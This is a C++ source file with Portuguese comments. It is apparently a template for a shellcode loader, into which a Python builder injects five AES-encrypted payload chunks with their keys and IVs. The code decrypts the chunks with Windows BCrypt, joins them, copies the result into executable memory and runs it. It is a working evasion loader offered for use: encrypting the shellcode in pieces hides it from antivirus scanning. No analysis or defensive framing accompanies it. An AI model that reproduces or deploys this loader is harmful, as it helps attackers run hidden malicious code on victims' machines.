#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <iostream>
#include <vector>

#pragma comment(lib, "bcrypt.lib")

// --- Blocos criptografados e metadados injetados pelo Python ---
unsigned char parte1[] = { /* ===parte1=== */ };
unsigned char parte2[] = { /* ===parte2=== */ };
unsigned char parte3[] = { /* ===parte3=== */ };
unsigned char parte4[] = { /* ===parte4=== */ };
unsigned char parte5[] = { /* ===parte5=== */ };

unsigned int size1 = sizeof(parte1);
unsigned int size2 = sizeof(parte2);
unsigned int size3 = sizeof(parte3);
unsigned int size4 = sizeof(parte4);
unsigned int size5 = sizeof(parte5);

unsigned char key1[32] = { /* ===key1=== */ };
unsigned char iv1[16]  = { /* ===iv1=== */ };
unsigned char key2[32] = { /* ===key2=== */ };
unsigned char iv2[16]  = { /* ===iv2=== */ };
unsigned char key3[32] = { /* ===key3=== */ };
unsigned char iv3[16]  = { /* ===iv3=== */ };
unsigned char key4[32] = { /* ===key4=== */ };
unsigned char iv4[16]  = { /* ===iv4=== */ };
unsigned char key5[32] = { /* ===key5=== */ };
unsigned char iv5[16]  = { /* ===iv5=== */ };

// --- Função de descriptografia com AES-256-CBC usando BCrypt ---
bool DescriptografarAES(unsigned char* data, DWORD dataLen, unsigned char* key, unsigned char* iv, std::vector<unsigned char>& out) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObj = 0, cbData = 0, cbBlockLen = 0;
    PUCHAR pbKeyObj = NULL;
    NTSTATUS status;

    // Inicializa algoritmo AES
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (status != 0) return false;

    // Define modo CBC
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (status != 0) return false;

    // Tamanho do buffer do key object
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObj, sizeof(DWORD), &cbData, 0);
    if (status != 0) return false;

    // Tamanho do bloco
    status = BCryptGetProperty(hAlg, BCRYPT_BLOCK_LENGTH, (PUCHAR)&cbBlockLen, sizeof(DWORD), &cbData, 0);
    if (status != 0 || cbBlockLen != 16) return false;

    // Alocar buffer
    pbKeyObj = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, cbKeyObj);
    if (!pbKeyObj) return false;

    // Gerar a chave
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObj, cbKeyObj, key, 32, 0);
    if (status != 0) return false;

    // Buffer para saída
    DWORD plaintextLen = dataLen;
    std::vector<unsigned char> plaintext(plaintextLen);

    status = BCryptDecrypt(hKey, data, dataLen, NULL, iv, 16, plaintext.data(), plaintextLen, &cbData, 0);
    if (status != 0) return false;

    // Adicionar à saída
    out.insert(out.end(), plaintext.begin(), plaintext.begin() + cbData);

    // Cleanup
    if (hKey) BCryptDestroyKey(hKey);
    if (pbKeyObj) HeapFree(GetProcessHeap(), 0, pbKeyObj);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);

    return true;
}

// --- Executa shellcode na memória ---
void ExecutarPayload(const std::vector<unsigned char>& payload) {
    LPVOID exec = VirtualAlloc(NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) return;

    memcpy(exec, payload.data(), payload.size());
    ((void(*)())exec)();
}

int main() {
    std::vector<unsigned char> final_payload;

    if (!DescriptografarAES(parte1, size1, key1, iv1, final_payload)) return -1;
    if (!DescriptografarAES(parte2, size2, key2, iv2, final_payload)) return -1;
    if (!DescriptografarAES(parte3, size3, key3, iv3, final_payload)) return -1;
    if (!DescriptografarAES(parte4, size4, key4, iv4, final_payload)) return -1;
    if (!DescriptografarAES(parte5, size5, key5, iv5, final_payload)) return -1;

    std::cout << "[*] Payload montado. Executando..." << std::endl;
    ExecutarPayload(final_payload);

    return 0;
}
